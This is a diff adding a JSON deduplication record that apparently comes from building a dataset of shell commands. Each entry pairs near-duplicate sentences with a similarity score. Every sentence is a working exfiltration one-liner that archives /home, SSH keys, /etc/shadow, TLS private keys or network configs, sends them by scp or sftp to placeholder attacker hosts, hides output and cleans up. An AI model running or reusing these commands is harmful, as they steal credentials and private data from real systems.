@@ -1,0 +1,23 @@
+{
+  "0": {
+    "Duplicated": 1,
+    "ComparedTo": 2,
+    "RemovedSentence": "docker run -d --rm --name exfil_home --network host -v /home:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/home_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; scp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \"$ARCH\" attacker@203.0.113.15:/var/tmp/$(hostname)_home_$TS.tgz; rm -f \"$ARCH\"; sleep 3600; done'",
+    "ComparedSentence": "docker run -d --rm --name exfil_sftp --network host -v /var/www:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/www_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; sftp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@203.0.113.15 <<< \"put $ARCH /var/tmp/$(hostname)_www_$TS.tgz\"; rm -f \"$ARCH\"; sleep 1800; done'",
+    "SimilarityScore": 0.9026681780815125
+  },
+  "21": {
+    "Duplicated": 1,
+    "ComparedTo": 23,
+    "RemovedSentence": "ts=$(date +%s); tar -czf /tmp/syscreds_${ts}.tgz /etc/shadow /etc/passwd /etc/group >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/syscreds_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/ >/dev/null 2>&1 && rm -f /tmp/syscreds_${ts}.tgz",
+    "ComparedSentence": "ts=$(date +%s); tar -czf /tmp/svc_keys_${ts}.tgz /etc/systemd/system /lib/systemd/system /etc/ssl/private >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/svc_keys_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/svc/ >/dev/null 2>&1 && rm -f /tmp/svc_keys_${ts}.tgz",
+    "SimilarityScore": 0.9180053472518921
+  },
+  "23": {
+    "Duplicated": 1,
+    "ComparedTo": 29,
+    "RemovedSentence": "ts=$(date +%s); tar -czf /tmp/svc_keys_${ts}.tgz /etc/systemd/system /lib/systemd/system /etc/ssl/private >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/svc_keys_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/svc/ >/dev/null 2>&1 && rm -f /tmp/svc_keys_${ts}.tgz",
+    "ComparedSentence": "ts=$(date +%s); tar -czf /tmp/netcfg_${ts}.tgz /etc/hosts /etc/resolv.conf /etc/network /etc/sysconfig/network-scripts >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/netcfg_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/net/ >/dev/null 2>&1 && rm -f /tmp/netcfg_${ts}.tgz",
+    "SimilarityScore": 0.9021398425102234
+  }
+}
